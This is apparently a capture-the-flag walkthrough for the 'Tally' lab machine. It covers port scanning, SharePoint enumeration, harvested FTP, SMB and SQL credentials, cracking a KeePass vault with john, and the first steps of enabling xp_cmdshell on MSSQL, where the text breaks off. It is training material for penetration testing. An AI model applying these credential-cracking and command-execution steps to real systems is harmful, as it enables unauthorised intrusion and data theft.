# Tally

| Hostname   | Difficulty |
| ---        | ---        |
| Tally      | Hard       |

Machine IP: 10.10.10.59 :

```bash
TARGET=10.10.10.59       # README IP address
ATTACKER=10.10.14.17     # attacker IP
```

## Initial Reconnaissance

### Ports and services

```shell
nmap -sT -Pn $TARGET -p - --open -sV -sC -A 
```

Result:

```text
Nmap scan report for 10.10.10.59
Host is up (0.020s latency).
Not shown: 63701 closed tcp ports (conn-refused), 1813 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Home
|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
|_http-generator: Microsoft SharePoint
81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-05-09T19:22:01
|_Not valid after:  2053-05-09T19:22:01
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-05-09T19:34:00+00:00; +1s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
15567/tcp open  http               Microsoft IIS httpd 10.0
| http-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
32844/tcp open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
| Subject Alternative Name: DNS:localhost, DNS:tally
| Not valid before: 2017-09-17T22:51:16
|_Not valid after:  9999-01-01T00:00:00
|_ssl-date: 2023-05-09T19:34:00+00:00; +1s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Service Unavailable
32846/tcp open  storagecraft-image StorageCraft Image Manager
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc              Microsoft Windows RPC
49665/tcp open  msrpc              Microsoft Windows RPC
49666/tcp open  msrpc              Microsoft Windows RPC
49667/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
49669/tcp open  msrpc              Microsoft Windows RPC
49670/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/9%OT=21%CT=1%CU=31817%PV=Y%DS=2%DC=T%G=Y%TM=645AA028
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=A
OS:)OPS(O1=M539NW8ST11%O2=M539NW8ST11%O3=M539NW8NNT11%O4=M539NW8ST11%O5=M53
OS:9NW8ST11%O6=M539ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000
OS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T
OS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2023-05-09T19:33:49
|_  start_date: 2023-05-09T19:21:41
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   19.97 ms 10.10.14.1
2   20.45 ms 10.10.10.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.82 seconds
```

### Information founds

| port      | service       | Information |
| ---       | ---           | ---         |
| 21/tcp    | FTP           |             |
| 80/tcp    | http          | Microsoft SharePoint |
| 81/tcp    | http          | SSDP/UPnP   |
| 135/tcp   | RPC           |             |
| 139/tcp   | RPC           |             |
| 445/tcp   | netbios-ssn   |             |
| 808/tcp   | ccproxy-http? |             |
| 1433/tcp  | ms-sql-s      | Microsoft SQL Server 2016 13.00.1601.00; RTM |
| 5985/tcp  | http          | SSDP/UPnP   |
| 15567/tcp | http          | Microsoft IIS httpd 10.0 |
| 32843/tcp | http          | SSDP/UPnP   |
| 32844/tcp | ssl/http      | SSDP/UPnP   |
| 32846/tcp | storagecraft-image  | StorageCraft Image Manager |
| 47001/tcp | http          | SSDP/UPnP |

The reported OS is: Windows Server 2008 R2 - 2012

### Service: HTTP - port 80/tcp - Microsoft SharePoint

nmap have been redirected to a langing page : http://10.10.10.59/_layouts/15/start.aspx#/default.aspx

![](web_sharepoint.png)

From the blue icon, this seems to be a Sharepoint instance.

Enumerate this web service :

```bash
gobuster dir -w /usr/share/dirb/wordlists/big.txt -t 30 -ekx '' -u "http://$TARGET/" --timeout 30s
```

Nothing interesting if found. Let's try with a sharepoint dictionnary :

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CMS/sharepoint.txt -t 30 -ekx '' -u "http://$TARGET/" --timeout 30s 
```

But this provide a lot of pages.

By searching a better approach, since this is a web application, OWASP help in enumeration.

The document [Getting a handle on SharePoint security complexity
](https://owasp.org/www-pdf-archive/OWASP_BeNeLux-SharePoint-Comprehensive_Security_model_v1.0.pdf) on OWASP web site to get more possibilities.

It points a tool named `sparty` that can provide a more efficient enumeration:

```shell
git clone https://github.com/alias1/sparty.git
cd sparty
python2 ./sparty_v_0.1.py -u http://$TARGET/ -s layouts
```

Result :

```text
[-] Sparty is written in Python 2.6.5 (final). Kindly use that version!
[devalias.net] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[devalias.net] !!! HERE THERE BE DRAGONS !!!
[devalias.net] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[devalias.net] Would you like to continue past this version check AT YOUR OWN RISK? (Type: YES): YES
	---------------------------------------------------------------

          _|_|_|    _|_|_|     _|_|    _|_|_|    _|_|_|_|_|  _|      _|
         _|        _|    _|  _|    _|  _|    _|      _|        _|  _|
           _|_|    _|_|_|    _|_|_|_|  _|_|_|        _|          _|
               _|  _|        _|    _|  _|    _|      _|          _|
         _|_|_|    _|        _|    _|  _|    _|      _|          _|

        SPARTY : Sharepoint/Frontpage Security Auditing Tool!
        Authored by: Aditya K Sood |{0kn0ck}@secniche.org  | 2013
        Twitter:     @AdityaKSood
        Powered by: SecNiche Security Labs !
        
	--------------------------------------------------------------
[+] fetching information from the given target : (http://10.10.10.59/default.aspx)
[+] target responded with HTTP code: (200)
[+] target is running server: (Microsoft-IIS/10.0)

[+]-----------------------------------------------------------------!
[+] auditing sharepoint '/_layouts/' directory for access permissions !
[+]-------------------------------------------------------------------!

[-] (http://10.10.10.59//_layouts/aclinv.aspx) - (401)
[-] (http://10.10.10.59//_layouts/addrole.aspx) - (401)
[-] (http://10.10.10.59//_layouts/AdminRecycleBin.aspx) - (401)
[+] (http://10.10.10.59//_layouts/AreaNavigationSettings.aspx) - (200)
[+] (http://10.10.10.59//_Layouts/AreaTemplateSettings.aspx) - (200)
[+] (http://10.10.10.59//_Layouts/AreaWelcomePage.aspx) - (200)
[-] (http://10.10.10.59//_layouts/associatedgroups.aspx) - (401)
[-] (http://10.10.10.59//_layouts/bpcf.aspx) - (401)
[+] (http://10.10.10.59//_Layouts/ChangeSiteMasterPage.aspx) - (200)
[-] (http://10.10.10.59//_layouts/create.aspx) - (401)
[-] (http://10.10.10.59//_layouts/editgrp.aspx) - (401)
[-] (http://10.10.10.59//_layouts/editprms.aspx) - (401)
[-] (http://10.10.10.59//_layouts/groups.aspx) - (401)
[+] (http://10.10.10.59//_layouts/help.aspx) - (200)
[-] (http://10.10.10.59//_layouts/images/) - (403)
[+] (http://10.10.10.59//_layouts/listedit.aspx) - (200)
[-] (http://10.10.10.59//_layouts/ManageFeatures.aspx) - (401)
[-] (http://10.10.10.59//_layouts/ManageFeatures.aspx) - (401)
[-] (http://10.10.10.59//_layouts/mcontent.aspx) - (401)
[-] (http://10.10.10.59//_layouts/mngctype.aspx) - (401)
[-] (http://10.10.10.59//_layouts/mngfield.aspx) - (401)
[-] (http://10.10.10.59//_layouts/mngsiteadmin.aspx) - (401)
[-] (http://10.10.10.59//_layouts/mngsubwebs.aspx) - (401)
[-] (http://10.10.10.59//_layouts/mngsubwebs.aspx?view=sites) - (401)
[+] (http://10.10.10.59//_layouts/mobile/mbllists.aspx) - (200)
[+] (http://10.10.10.59//_layouts/MyInfo.aspx) - (200)
[+] (http://10.10.10.59//_layouts/MyPage.aspx) - (200)
[-] (http://10.10.10.59//_layouts/MyTasks.aspx) - (401)
[-] (http://10.10.10.59//_layouts/navoptions.aspx) - (401)
[-] (http://10.10.10.59//_layouts/NewDwp.aspx) - (401)
[-] (http://10.10.10.59//_layouts/newgrp.aspx) - (401)
[-] (http://10.10.10.59//_layouts/newsbweb.aspx) - (401)
[+] (http://10.10.10.59//_layouts/PageSettings.aspx) - (200)
[-] (http://10.10.10.59//_layouts/people.aspx) - (401)
[-] (http://10.10.10.59//_layouts/people.aspx?MembershipGroupId=0) - (401)
[-] (http://10.10.10.59//_layouts/permsetup.aspx) - (401)
[+] (http://10.10.10.59//_layouts/picker.aspx) - (200)
[+] (http://10.10.10.59//_layouts/policy.aspx) - (200)
[+] (http://10.10.10.59//_layouts/policyconfig.aspx) - (200)
[+] (http://10.10.10.59//_layouts/policycts.aspx) - (200)
[+] (http://10.10.10.59//_layouts/Policylist.aspx) - (200)
[-] (http://10.10.10.59//_layouts/prjsetng.aspx) - (401)
[-] (http://10.10.10.59//_layouts/quiklnch.aspx) - (401)
[-] (http://10.10.10.59//_layouts/recyclebin.aspx) - (401)
[+] (http://10.10.10.59//_Layouts/RedirectPage.aspx) - (200)
[-] (http://10.10.10.59//_layouts/role.aspx) - (401)
[-] (http://10.10.10.59//_layouts/settings.aspx) - (401)
[+] (http://10.10.10.59//_layouts/SiteDirectorySettings.aspx) - (200)
[+] (http://10.10.10.59//_layouts/sitemanager.aspx) - (200)
[+] (http://10.10.10.59//_layouts/SiteManager.aspx?lro=all) - (200)
[-] (http://10.10.10.59//_layouts/spcf.aspx) - (401)
[-] (http://10.10.10.59//_layouts/storman.aspx) - (401)
[-] (http://10.10.10.59//_layouts/themeweb.aspx) - (401)
[-] (http://10.10.10.59//_layouts/topnav.aspx) - (401)
[-] (http://10.10.10.59//_layouts/user.aspx) - (401)
[+] (http://10.10.10.59//_layouts/userdisp.aspx) - (200)
[-] (http://10.10.10.59//_layouts/userdisp.aspx?ID=1) - (401)
[+] (http://10.10.10.59//_layouts/useredit.aspx) - (200)
[-] (http://10.10.10.59//_layouts/useredit.aspx?ID=1) - (401)
[+] (http://10.10.10.59//_layouts/viewgrouppermissions.aspx) - (200)
[+] (http://10.10.10.59//_layouts/viewlsts.aspx) - (200)
[-] (http://10.10.10.59//_layouts/vsubwebs.aspx) - (401)
[-] (http://10.10.10.59//_layouts/WPPrevw.aspx?ID=247) - (401)
[-] (http://10.10.10.59//_layouts/wrkmng.aspx) - (401)

[+] check for HTTP codes (200) for active list of accessible files or directories! (404) - Not exists | (403) - Forbidden ! (500) - Server Error

[+] (layout file access) - module executed successfully !
```

There are a few pages that returned a HTTP 200 codes :

```text
[+] (http://10.10.10.59//_layouts/AreaNavigationSettings.aspx) - (200)
[+] (http://10.10.10.59//_Layouts/AreaTemplateSettings.aspx) - (200)
[+] (http://10.10.10.59//_Layouts/AreaWelcomePage.aspx) - (200)
[+] (http://10.10.10.59//_Layouts/ChangeSiteMasterPage.aspx) - (200)
[+] (http://10.10.10.59//_layouts/help.aspx) - (200)
[+] (http://10.10.10.59//_layouts/listedit.aspx) - (200)
[+] (http://10.10.10.59//_layouts/mobile/mbllists.aspx) - (200)
[+] (http://10.10.10.59//_layouts/MyInfo.aspx) - (200)
[+] (http://10.10.10.59//_layouts/MyPage.aspx) - (200)
[+] (http://10.10.10.59//_layouts/PageSettings.aspx) - (200)
[+] (http://10.10.10.59//_layouts/picker.aspx) - (200)
[+] (http://10.10.10.59//_layouts/policy.aspx) - (200)
[+] (http://10.10.10.59//_layouts/policyconfig.aspx) - (200)
[+] (http://10.10.10.59//_layouts/policycts.aspx) - (200)
[+] (http://10.10.10.59//_layouts/Policylist.aspx) - (200)
[+] (http://10.10.10.59//_Layouts/RedirectPage.aspx) - (200)
[+] (http://10.10.10.59//_layouts/SiteDirectorySettings.aspx) - (200)
[+] (http://10.10.10.59//_layouts/sitemanager.aspx) - (200)
[+] (http://10.10.10.59//_layouts/SiteManager.aspx?lro=all) - (200)
[+] (http://10.10.10.59//_layouts/userdisp.aspx) - (200)
[+] (http://10.10.10.59//_layouts/useredit.aspx) - (200)
[+] (http://10.10.10.59//_layouts/viewgrouppermissions.aspx) - (200)
[+] (http://10.10.10.59//_layouts/viewlsts.aspx) - (200)
```

most of these pages are not interesting :

![](web_sharepoint_enum_not.png)

The last URL is interesting [/_layouts/viewlsts.aspx](http://10.10.10.59//_layouts/viewlsts.aspx) :

![](web_sharepoint_enum_site_content.png)

The "Documents" part contain a file "ftp-details.docx" has been modified by `tally\administrator`. This strongly suggest the host name: `tally`.

This word document contains a text :

```text
FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
```

| username | password | usage |
| ---      | ---      | ---   |
| ???      | UTDRSCH53c"$6hys | FTP |

The username is missing...

On the "Site Content" page, the "Site Pages" indicate "1 item", but clicking on it lead to a blank page.

Since we have a clue about the host name, we can set this name `tally` to point to its IP address :

```shell
echo "$TARGET    tally" >> /etc/hosts
```

We can analyse again this sharepoint from its hostname instead of its IP address :

```shell
python2 ./sparty_v_0.1.py -u http://tally/ -s layouts
```

But there is no significant change at this point.

Exploring again from [/_layouts/viewlsts.aspx](http://tally//_layouts/viewlsts.aspx) with its hostname, the "Site Pages" now show up its content :

![](web_sharepoint_enum_site_pages.png)

We can also display the page "Finance Team" :

![](web_sharepoint_enum_migration_note.png)

```text
Migration update

Hi all,

Welcome to your new team page!

As always, there's still a few finishing touches to make.  Rahul - please upload the design mock ups to the Intranet folder as 'index.html' using the ftp_user account - I aim to review regularly.

We'll also add the fund and client account pages in due course.

Thanks – Sarah & Tim.
```

There are new user names, and this `ftp_user` could be the username matching the FTP password previously found :

| username | password | usage |
| ---      | ---      | ---   |
| ftp_user      | UTDRSCH53c"$6hys | FTP |
| tally/administrator | |   |
| Rahul ???  |     |   |
| Sarah ???  |     |   |
| Tim ???    |     |   |

### Service: FTP - port 21/tcp

Since we have some FTP username and password, we can try :

```bash
ftp tally
```

and that match :

```text
Connected to tally.
220 Microsoft FTP Service
Name (tally:root): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

There some directories to explore :

- `From-Custodian/*.log`: log files
- `Intranet/Binaries/Firefox Setup 44.0.2.exe`
- `Logs/ftp_connect_.txt`: possibly ftp log files
- `To-Upload/employees-id_number.xlsx`
- `To-Upload/Invoices.zip`
- `User/`

Download all available files locally for analyse :

```bash
wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@tally'
```

#### Analyse of content

This will download all files in a folder named as the target hostname `tally` and we can get a full overview of files :

```shell
tree tally
```

Result:

```text
tally
├── From-Custodian
│   ├── RED-528103410.log
│   ├── RED-528113411.log
│   ├── RED-528123412.log
...
│   ├── RED-5287347.log
│   ├── RED-5288348.log
│   └── RED-5289349.log
├── Intranet
│   └── Binaries
│       └── Firefox Setup 44.0.2.exe
├── Logs
│   ├── ftp_connect_8235771490510.txt
│   ├── ftp_connect_8235771490511.txt
│   ├── ftp_connect_8235771490512.txt
...
│   ├── ftp_connect_823577149057.txt
│   ├── ftp_connect_823577149058.txt
│   └── ftp_connect_823577149059.txt
├── To-Upload
│   ├── employees-id_number.xlsx
│   └── Invoices.zip
└── User
    ├── Administrator
    │   └── New folder
    ├── Ekta
    │   ├── OFSI_quick_guide_flyer.pdf
    │   └── PSAIS_1_April_2017.pdf
    ├── Jess
    │   └── actu8-espreadsheet-designer-datasheet.pdf
    ├── Paul
    │   ├── financial-list-guide.pdf
    │   ├── financial_sanctions_guidance_august_2017.pdf
    │   ├── Monetary_penalties_for_breaches_of_financial_sanctions.pdf
    │   └── New folder
    ├── Rahul
    │   └── Mockups-Backup
    ├── Sarah
    │   ├── MBSASetup-x64-EN.msi
    │   ├── notes.txt
    │   └── Windows-KB890830-x64-V5.52.exe
    ├── Stuart
    │   ├── customers - Copy.csv
    │   └── Unit4-Connect-Financials-Agenda.pdf
    ├── Tim
    │   ├── Files
    │   │   ├── bonus.txt
    │   │   ├── KeePass-2.36
    │   │   │   ├── KeePass.chm
    │   │   │   ├── KeePass.exe
    │   │   │   ├── KeePass.exe.config
    │   │   │   ├── KeePassLibC32.dll
    │   │   │   ├── KeePassLibC64.dll
    │   │   │   ├── KeePass.XmlSerializers.dll
    │   │   │   ├── License.txt
    │   │   │   ├── Plugins
    │   │   │   ├── ShInstUtil.exe
    │   │   │   └── XSL
    │   │   │       ├── KDBX_Common.xsl
    │   │   │       ├── KDBX_DetailsFull_HTML.xsl
    │   │   │       ├── KDBX_DetailsLight_HTML.xsl
    │   │   │       ├── KDBX_PasswordsOnly_TXT.xsl
    │   │   │       └── KDBX_Tabular_HTML.xsl
    │   │   └── tim.kdbx
    │   └── Project
    │       ├── Communications
    │       ├── Log
    │       │   └── do to.txt
    │       └── Vendors
    └── Yenwi
        └── Archive

27 directories, 130 files
```

File `To-Upload/employees-id_number.xlsx` contains a list of employees with an id (from 1 to 179), their first name, and name.

`To-Upload/Invoices.zip` can be uncompressed and contains a list of CSV files.

The text note `tally/User/Sarah/notes.txt` :

```text
done

install Sharepoint, replace Orchard CMS

to do

uninstall SQL Server 2016
```

This note comes with 2 files :
- `MBSASetup-x64-EN.msi` : analysing this file, this is an installer for "Microsoft Baseline Security Analyzer 2.3"
- `Windows-KB890830-x64-V5.52.exe` : From [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB890830), this is a Malware Removal Tools

From the note, the SQL Server 2016 is still running and accessible on port 1433. It seems to be related to Orchard CMS which have been removed.

The text note `tally/User/Tim/Project/Log/do to.txt` :

```text
To do:

Remove migration folder
Set secure share permissions

encrypted share creds:

password in keepass
```

Some shared folders may be insecure.

The keepass file it referes to should be the one in the same folder : `tally/User/Tim/Files/tim.kdbx`. Let's try to crack this password file :

```shell
keepass2john tally/User/Tim/Files/tim.kdbx > tim.hash
john --wordlist=/usr/share/wordlists/rockyou.txt tim.hash 
```

Result:

```text
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
simplementeyo    (tim)     
1g 0:00:00:06 DONE (2023-05-10 22:04) 0.1605g/s 3962p/s 3962c/s 3962C/s teamojulio..simplementeyo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password of keepassfile `tally/User/Tim/Files/tim.kdbx` is : `simplementeyo`.

We can now open this vault with the password, and discover some new credentials :

```bash
keepassx tim.kdbx
```

| Title                           | Username | password | note |
| ---                             | ---     | ---       | ---   |
| WORK/CISCO/Default                   | cisco   | cisco123  |       |
| WORK/Windows/Share/TALLY ACCT Share | Finance | Acc0unting |      |
| WORK/SOFTWARE/PDF Writer                      | 64257-56525-54257-54734 | | |

This seem to be a credential for the "ACCT" share, so let's check it.

#### Informations found

- File `To-Upload/employees-id_number.xlsx` contains a list of employees with an id (from 1 to 179), their first name, and name.
- From the note `User/Sarah/notes.txt`, there could be a MS SQL Server 2016 running on this host
- From the files in `User/Sarah/`: "Microsoft Baseline Security Analyzer 2.3" is probably installed
- From the files in `User/Sarah/`: KB890830 (Malware Removal Tools) is probably installed
- `tally/User/Tim/Project/Log/do to.txt` : some shared folders may be insecure

### SMB Shares

List availaible shares :

```bash
smbclient -L "//tally/" -U 'tally\Finance'
```

Result :

```text
Enter TALLY\Finance's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ACCT            Disk      
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

So there is only the share "ACCT" as a non-administrative share. Let's explore it :

```shell
smbclient  "//tally/ACCT/" -U 'tally\Finance'
```

Result:

```text
Enter TALLY\Finance's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Sep 18 07:58:18 2017
  ..                                  D        0  Mon Sep 18 07:58:18 2017
  Customers                           D        0  Sun Sep 17 22:28:40 2017
  Fees                                D        0  Mon Aug 28 23:20:52 2017
  Invoices                            D        0  Mon Aug 28 23:18:19 2017
  Jess                                D        0  Sun Sep 17 22:41:29 2017
  Payroll                             D        0  Mon Aug 28 23:13:32 2017
  Reports                             D        0  Fri Sep  1 22:50:11 2017
  Tax                                 D        0  Sun Sep 17 22:45:47 2017
  Transactions                        D        0  Wed Sep 13 21:57:44 2017
  zz_Archived                         D        0  Fri Sep 15 22:29:35 2017
  zz_Migration                        D        0  Sun Sep 17 22:49:13 2017

		8387839 blocks of size 4096. 723392 blocks available
smb: \>
```


In folder : `zz_Migration/Binaries/New folder`, there are some applcation installers :

```text
crystal_reports_viewer_2016_sp04_51051980.zip
putty.exe
tester.exe
Macabacus2016.exe
RpprtSetup.exe
vcredist_x64.exe
Orchard.Web.1.7.3.zip
tableau-desktop-32bit-10-3-2.exe
```

The text note `zz_Archived/SQL/conn-info.txt` :

```text
old server details

db: sa
pass: YE%TJC%&HYbe5Nw

have changed for tally
```

Let's try this old credential with impacket tools:

```bash
mssqlclient.py "sa:YE%TJC%&HYbe5Nw@tally"
```

Result :

```text
Impacket for Exegol - v0.10.1.dev1+20230318.114933.11c51f7 - Copyright 2022 Fortra - forked by ThePorgs

[*] Encryption required, switching to TLS
[-] ERROR(TALLY): Line 1: Login failed for user 'sa'.
```

The archive `zz_Migration\Backup\20170808\orcharddb\orcharddb.zip` could be interesting, so let's analyse its content after downloading to attacker machine.


This zip archive is password protected, but it can be extracted by using the same password as for the share `Acc0unting` :

```
unzip orcharddb.zip
Archive:  orcharddb.zip
[orcharddb.zip] orcharddb.sql password: 
  inflating: orcharddb.sql 
```

Content of `orcharddb.sql` :

```SQL
/*    ==Scripting Parameters==

    Source Server Version : SQL Server 2016 (13.0.1601)
    Source Database Engine Edition : Microsoft SQL Server Enterprise Edition
    Source Database Engine Type : Standalone SQL Server

    Target Server Version : SQL Server 2017
    Target Database Engine Edition : Microsoft SQL Server Standard Edition
    Target Database Engine Type : Standalone SQL Server
*/
USE [orcharddb]
GO
/****** Object:  Table [dbo].[default_Orchard_Users_UserPartRecord]    Script Date: 03/09/2017 14:57:24 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
CREATE TABLE [dbo].[default_Orchard_Users_UserPartRecord](
	[Id] [int] NOT NULL,
	[UserName] [nvarchar](255) NULL,
	[Email] [nvarchar](255) NULL,
	[NormalizedUserName] [nvarchar](255) NULL,
	[Password] [nvarchar](255) NULL,
	[PasswordFormat] [nvarchar](255) NULL,
	[HashAlgorithm] [nvarchar](255) NULL,
	[PasswordSalt] [nvarchar](255) NULL,
	[RegistrationStatus] [nvarchar](255) NULL,
	[EmailStatus] [nvarchar](255) NULL,
	[EmailChallengeToken] [nvarchar](255) NULL,
PRIMARY KEY CLUSTERED 
(
	[Id] ASC
)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
) ON [PRIMARY]
GO
INSERT [dbo].[default_Orchard_Users_UserPartRecord] ([Id], [UserName], [Email], [NormalizedUserName], [Password], [PasswordFormat], [HashAlgorithm], [PasswordSalt], [RegistrationStatus], [EmailStatus], [EmailChallengeToken]) VALUES (2, N'admin', N'', N'admin', N'Finance2', N'Clear', N'SHA1', N's2Ieb5Pn7Vwf+X6JEXJitg==', N'Approved', N'Approved', NULL)
ALTER TABLE [dbo].[default_Orchard_Users_UserPartRecord] ADD  DEFAULT ('Approved') FOR [RegistrationStatus]
GO
ALTER TABLE [dbo].[default_Orchard_Users_UserPartRecord] ADD  DEFAULT ('Approved') FOR [EmailStatus]
GO
```

Found a credential :

| username | password | usage |
| --- | --- | --- |
| admin | Finance2 | |

This seem to be the administrator of the orchard CMS that have been removed. This is an application user, not a database user.

Back in ACCT share enumeration, `\zz_Migration\Binaries\New folder\` is of some interest :

```text
  crystal_reports_viewer_2016_sp04_51051980.zip      A 389188014  Wed Sep 13 21:56:38 2017
  Macabacus2016.exe                   A 18159024  Mon Sep 11 23:20:05 2017
  Orchard.Web.1.7.3.zip               A 21906356  Wed Aug 30 01:27:42 2017
  putty.exe                           A   774200  Sun Sep 17 22:19:26 2017
  RpprtSetup.exe                      A   483824  Fri Sep 15 21:49:46 2017
  tableau-desktop-32bit-10-3-2.exe      A 254599112  Mon Sep 11 23:13:14 2017
  tester.exe                          A   215552  Fri Sep  1 13:15:54 2017
  vcredist_x64.exe                    A  7194312  Wed Sep 13 22:06:28 2017
```

This seems to be a backup of deliveries used during the migration from orchard CMS to Sharepoint. All executables seems to be publicly known installation files except `tester.exe`. Download this file for analysis, then :

```bash
strings tester.exe
```

This seem to be a custom C/C++ application, that could explain the presence of "vcredist_x64.exe". There are some interesting strings here (hardcoded credentials) :

```text
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;
select * from Orchard_Users_UserPartRecord
```

| username | password               | usage         |
| ---     | ---                     | ---           |
| sa      | GWE3V65#6KFH93@4GWTG2G  | MS SQL server |

### Microsoft SQL Server 2016 - 1433/tcp

Using the previous user/password, we can connect to the MS SQL Server :

```shell
mssqlclient.py sa:'GWE3V65#6KFH93@4GWTG2G'@tally
```

Result:

```text
Impacket for Exegol - v0.10.1.dev1+20230318.114933.11c51f7 - Copyright 2022 Fortra - forked by ThePorgs

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(TALLY): Line 1: Changed database context to 'master'.
[*] INFO(TALLY): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 665) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 
```

Following [Hacktricks: 1433 - Pentesting MSSQL - Microsoft SQL Server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server), we can do some enumeration, but we can use this session to execute commands directly.

## Initial access

### Exploitation


Still following Following [Hacktricks: 1433 - Pentesting MSSQL - Microsoft SQL Server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server), we can execute system commands :

```sql
# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

Result:

```text
SQL (sa  dbo@master)> SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
SQL (sa  dbo@master)> sp_configure 'show advanced options', '1'
